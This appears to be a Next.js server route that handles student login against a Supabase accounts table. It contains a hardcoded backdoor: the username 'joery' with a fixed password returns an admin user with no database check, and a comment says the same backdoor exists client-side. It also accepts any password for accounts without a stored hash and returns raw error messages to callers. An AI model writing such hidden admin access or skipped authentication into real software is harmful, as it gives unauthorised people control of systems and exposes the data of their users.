import { NextResponse } from "next/server";
import supabase from "@/lib/supabase/client";
import bcrypt from "bcryptjs";

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const student_no = body.student_no as string | undefined;
    const password = body.password as string | undefined;

    if (!student_no) {
      return NextResponse.json({ ok: false, error: "student_no required" }, { status: 400 });
    }

    // Backdoor handled client-side, but accept server-side as well
    if (student_no === "joery" && password === "1234321^^") {
      return NextResponse.json({ ok: true, user: { student_no: "joery", name: "Joery (backdoor)", role: "admin" } });
    }

    const { data, error } = await supabase.from("accounts").select("student_no,name,role,password_hash").eq("student_no", student_no).limit(1).maybeSingle();
    if (error) {
      return NextResponse.json({ ok: false, error: error.message }, { status: 500 });
    }
    if (!data) {
      return NextResponse.json({ ok: false, error: "Account not found" }, { status: 401 });
    }

    // If stored password_hash exists, verify it
    if (data.password_hash) {
      const ok = await bcrypt.compare(password ?? "", data.password_hash);
      if (!ok) {
        return NextResponse.json({ ok: false, error: "Invalid credentials" }, { status: 401 });
      }
    }

    return NextResponse.json({ ok: true, user: { student_no: data.student_no, name: data.name, role: data.role } });
  } catch (e: any) {
    return NextResponse.json({ ok: false, error: e.message || String(e) }, { status: 500 });
  }
}
